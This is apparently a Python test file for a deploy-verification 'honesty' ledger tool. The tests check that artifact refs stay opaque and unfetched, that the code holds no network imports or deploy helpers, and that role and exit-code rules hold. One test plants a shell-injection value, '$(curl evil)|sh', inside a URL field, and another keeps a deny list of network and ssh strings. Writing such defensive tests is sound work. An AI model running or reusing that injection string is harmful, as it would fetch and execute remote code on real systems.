"""Security tests for P-deploy Mode C opaque refs and boundary (§PD.9)."""

from __future__ import annotations

import inspect
from pathlib import Path

from tests.fixtures.p_deploy import load_p_deploy_entry, seed_p_deploy_repo
from tools.honesty.ledger import append_entry
from tools.honesty.status import HonestyStatusOptions, run_honesty_status
from tools.honesty.types import LedgerAppendOptions


def test_url_and_shell_metachar_ref_opaque_never_fetched(repo_root) -> None:
    config = seed_p_deploy_repo(repo_root, require_deploy_health="require")
    body = load_p_deploy_entry("verification-with-deploy-health.json")
    body["artifacts"][1]["ref"] = "https://prod.example/health?cmd=$(curl evil)|sh"
    assert (
        append_entry(
            config=config,
            repo_root=repo_root,
            options=LedgerAppendOptions(kind="verification_evidence", body=body),
        ).exit_code
        == 0
    )
    result = run_honesty_status(
        config=config,
        repo_root=repo_root,
        options=HonestyStatusOptions(
            hook=None,
            artifact=None,
            deploy_health="Track P / P-deploy",
        ),
    )
    assert result.exit_code == 0


def test_no_network_imports_on_mode_c_paths() -> None:
    import tools.honesty.ledger as ledger_mod
    import tools.honesty.status as status_mod
    import tools.honesty.validate as validate_mod

    for module in (ledger_mod, status_mod, validate_mod):
        source = inspect.getsource(module)
        assert "urllib" not in source
        assert "requests" not in source
        assert "httpx" not in source
        assert "urlopen" not in source


def test_no_kit_side_deploy_or_probe_helpers_in_honesty_and_skill() -> None:
    root = Path(__file__).resolve().parents[2]
    skill = (root / "cursor" / "skills" / "deploy-verification-review" / "SKILL.md").read_text(
        encoding="utf-8"
    )
    assert "never HTTP" in skill or "never opens HTTP" in skill.lower() or "never deploys" in skill
    honesty_tools = root / "tools" / "honesty"
    for path in honesty_tools.rglob("*.py"):
        text = path.read_text(encoding="utf-8")
        assert "urlopen" not in text
        assert "kubectl" not in text
        assert "ssh " not in text.lower()


def test_producer_cannot_append_deploy_health_evidence(repo_root) -> None:
    config = seed_p_deploy_repo(repo_root)
    body = load_p_deploy_entry("verification-with-deploy-health.json")
    body["actor_role"] = "producer"
    result = append_entry(
        config=config,
        repo_root=repo_root,
        options=LedgerAppendOptions(kind="verification_evidence", body=body),
    )
    assert result.exit_code == 23


def test_exit_34_not_waived_when_require_and_mode_c_invoked(repo_root) -> None:
    config = seed_p_deploy_repo(repo_root, require_deploy_health="require")
    result = run_honesty_status(
        config=config,
        repo_root=repo_root,
        options=HonestyStatusOptions(
            hook=None,
            artifact=None,
            deploy_health="Track P / P-deploy",
        ),
    )
    assert result.exit_code == 34
    assert result.json_payload.error == "missing_deploy_health"


def test_twin_skill_paths_exist() -> None:
    root = Path(__file__).resolve().parents[2]
    vendored = root / "cursor" / "skills" / "deploy-verification-review" / "SKILL.md"
    local = root / ".cursor" / "skills" / "deploy-verification-review" / "SKILL.md"
    assert vendored.is_file()
    assert local.is_file()
    assert vendored.read_text(encoding="utf-8") == local.read_text(encoding="utf-8")
    text = vendored.read_text(encoding="utf-8")
    for marker in ("D1", "D2", "D3", "D4", "D5", "D6", "D7", "D8"):
        assert marker in text
